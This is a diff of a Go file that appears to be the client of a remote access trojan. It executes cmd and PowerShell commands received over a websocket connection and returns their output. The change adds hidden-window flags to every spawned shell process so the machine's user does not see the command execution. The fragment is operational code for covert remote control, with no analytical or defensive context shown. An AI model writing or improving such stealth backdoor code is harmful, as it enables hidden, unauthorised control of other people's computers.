@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"io/ioutil"
+	"syscall"
 
 	"main/Encrypt"
 	"main/Helper"
@@ -62,7 +63,7 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 	case "OSshell":
 		go func() {
 			cmd := exec.Command("cmd", "/c", unmsgpack.ForcePathObject("Command").GetAsString())
-
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			var stdout, stderr bytes.Buffer
 			cmd.Stdout = &stdout
 			cmd.Stderr = &stderr
@@ -86,7 +87,7 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 		{
 			go func() {
 				powershell := exec.Command("powershell", "-Command", unmsgpack.ForcePathObject("Command").GetAsString())
-
+				powershell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 				var stdout, stderr bytes.Buffer
 				powershell.Stdout = &stdout
 				powershell.Stderr = &stderr
@@ -401,6 +402,7 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 		{
 			go func() {
 				cmd := exec.Command("cmd")
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 				result := ""
 				output, err := cmd.Output()
 				if err != nil {
@@ -438,7 +440,7 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 				executeCommandAndHandleCD(cmdString)
 
 				cmd := exec.Command("cmd", "/c", "cd "+ProcessPath+"&&"+cmdString)
-
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 				var stdout, stderr bytes.Buffer
 				cmd.Stdout = &stdout
 				cmd.Stderr = &stderr
